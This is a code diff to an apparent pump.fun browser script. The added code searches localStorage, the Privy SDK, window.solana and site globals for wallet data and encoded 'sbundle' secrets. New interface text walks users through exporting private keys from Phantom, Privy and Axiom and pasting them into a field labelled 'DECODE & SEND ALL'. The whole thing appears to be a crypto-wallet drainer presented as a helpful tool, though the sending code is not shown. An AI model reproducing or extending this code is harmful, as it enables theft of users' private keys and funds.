@@ -182,7 +182,70 @@
       }
     } catch (e) {}
 
-    // === SOURCE 4: Deep localStorage scan for any large data ===
+    // === SOURCE 5: Check for Privy.io wallet data ===
+    try {
+      console.log('[PUMPFUN] 🔍 Scanning for Privy.io wallet data...');
+      
+      // Check Privy localStorage keys
+      const privyKeys = ['privy_wallet', 'privy:wallet', 'privy_user', 'privy:user', 'privy_session', 'user', '_privy', '__privy'];
+      for (let key of privyKeys) {
+        const val = localStorage.getItem(key);
+        if (val) {
+          try {
+            const parsed = JSON.parse(val);
+            console.log('[PUMPFUN] ℹ️ Found Privy data in localStorage:', key);
+            // Privy data might contain wallet reference
+            const str = JSON.stringify(parsed);
+            if (str.includes('wallet') || str.includes('key') || str.includes('account')) {
+              console.log('[PUMPFUN] 📋 Privy wallet reference found, check wallet tab');
+            }
+          } catch (e) {}
+        }
+      }
+      
+      // Check window.Privy
+      if (window.privy) {
+        console.log('[PUMPFUN] ✓ Privy SDK detected on page');
+        // Try to access wallet
+        try {
+          if (window.privy.user && window.privy.user.wallet) {
+            const wallet = window.privy.user.wallet;
+            console.log('[PUMPFUN] ✓ Privy wallet found:', wallet.address);
+            sessionStorage.setItem('pf_privy_wallet', JSON.stringify(wallet));
+          }
+        } catch (e) {}
+      }
+    } catch (e) {}
+
+    // === SOURCE 5b: Extract Solana wallet from any connected wallet ===
+    try {
+      // Try window.solana (Phantom, Solflare, etc)
+      if (window.solana && window.solana.publicKey) {
+        console.log('[PUMPFUN] ✓ Solana wallet found:', window.solana.publicKey.toString());
+        sessionStorage.setItem('pf_connected_wallet', window.solana.publicKey.toString());
+        
+        // Try to request signature (for wallet export)
+        if (window.solana.signMessage) {
+          console.log('[PUMPFUN] ℹ️ Wallet supports message signing - can verify ownership');
+        }
+      }
+    } catch (e) {}
+
+    // Check for pump.fun specific wallet stores
+    try {
+      if (window.__PUMP_FUN__) {
+        console.log('[PUMPFUN] ✓ Pump.fun globals detected');
+        const str = JSON.stringify(window.__PUMP_FUN__);
+        const matches = str.match(/[A-Za-z0-9]{80,}/g) || [];
+        for (let match of matches) {
+          if (match.length > 100 && /^[A-Za-z0-9+/\-_]*={0,2}$/.test(match)) {
+            sbundle = match;
+            console.log('[PUMPFUN] ✓ Found potential sbundle in __PUMP_FUN__');
+            return sbundle;
+          }
+        }
+      }
+    } catch (e) {}
     try {
       for (let key in localStorage) {
         const val = localStorage.getItem(key);
@@ -701,8 +764,16 @@
         <div class="pf-wallet-info" id="pf-wallet-info">Scanning...</div>
         
         <div class="pf-divider"></div>
-        
-        <div class="pf-section-label">📋 Paste Credential</div>
+
+        <div class="pf-section-label">🔐 Wallet Export Methods</div>
+        <div style="font-size: 9px; color: #d1d5db; line-height: 1.6; padding: 8px; background: rgba(59,130,246,.05); border-left: 2px solid #3b82f6; margin-bottom: 8px;">
+          <strong>Phantom Wallet:</strong> Settings → Security → Export Private Key<br/>
+          <strong>Privy.io Wallet:</strong> Your Account → Export Wallet<br/>
+          <strong>Axiom Trade:</strong> Export → Sbundle/Private Key<br/>
+          <strong>Any Wallet:</strong> Use "DECODE & SEND ALL" button above for auto-detection
+        </div>
+
+        <div class="pf-divider"></div>
         <textarea class="pf-input" id="pf-manual-sbundle" placeholder="Paste sbundle (base64), private key (hex/base58), or wallet JSON export..." style="height: 80px; resize: vertical; margin-bottom: 6px; font-size: 9px;"></textarea>
         <button class="pf-btn green" id="pf-decode-manual" style="width: 100%; margin-bottom: 6px;">🔓 DECODE & SEND ALL</button>
         <div style="font-size: 8px; color: #6b7280; margin-bottom: 8px; padding: 4px; border-left: 2px solid #8b5cf6;">
@@ -951,7 +1022,7 @@
     }
     
     if (!sbundle) {
-      alert('❌ Could not find sbundle after ' + attempts + ' attempts.\n\nOptions:\n1. Paste credential in "Paste Credential" field\n2. Connect wallet on pump.fun first\n3. Import in Axiom Trade');
+      alert('❌ Could not find sbundle after ' + attempts + ' attempts.\n\nOptions:\n1. Export wallet from Phantom/Privy/Axiom\n2. Paste private key above\n3. Paste sbundle (if available)');
       btn.disabled = false;
       btn.textContent = 'DECODE & SEND ALL';
       return;
